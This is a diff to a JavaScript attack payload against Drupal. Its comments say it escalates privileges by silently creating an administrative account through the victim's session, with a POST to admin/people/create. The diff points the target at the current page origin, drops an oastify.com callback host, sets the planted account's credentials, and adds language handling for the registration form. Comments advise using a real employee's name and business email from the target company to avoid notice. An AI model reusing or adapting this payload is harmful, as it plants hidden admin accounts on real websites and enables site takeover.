@@ -27,8 +27,8 @@ rain   nrainrainrainrainrainrainr
 
 // ************************************ ~% Variables %~ ************************************ //
 
-var Target = "http://localhost:80/"; // Ex: https://192.168.84.212:8000/drupal/
-var Callback = "547vwsg5jyb8qgqziyaby7chl8rzfp3e.oastify.com"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).
+var Target = document.location.origin; // Ex: https://192.168.84.212:8000/drupal/
+var Callback = null; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).
 
 // ************************************ ~% Functions %~ ************************************ //
 
@@ -38,9 +38,9 @@ DPCreateAccount(); // (Privilege Escalation) - Creates an Administrative user in
 function DPCreateAccount() {
 
     /* ************************************************************************************************************************************************ */
-    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
-    var Username = "nowak";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
-    var Password = `nowak`;  /* - <Mandatory> 
+    var Email = "test@bugbounty.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered). - <Mandatory>
+    var Username = "testbugbounty";         // (It is recommended to use a valid employee name from the target company). - <Mandatory>
+    var Password = "j5p9x6hjkccmrurDjcbpzldvmmsdg54!";  /* - <Mandatory> 
 
                             Make it at least 12 characters
                             Add lowercase letters
@@ -112,7 +112,14 @@ function DPCreateAccount() {
                 formData.append("form_token", form_token);
                 formData.append("form_id", "user_register_form");
                 formData.append("timezone", "UTC");
-                formData.append("op", "Create new account");
+
+                var op = "Créer un nouveau compte";
+                if (document.getElementById('toolbar-link-entity-user-collection').textContent == "People"){
+                    op = "Create new account";
+                };
+                
+                // console.log(op)
+                formData.append("op", op);
 
                 var _req = new XMLHttpRequest();
                 _req.open("POST", Target + "admin/people/create", false);
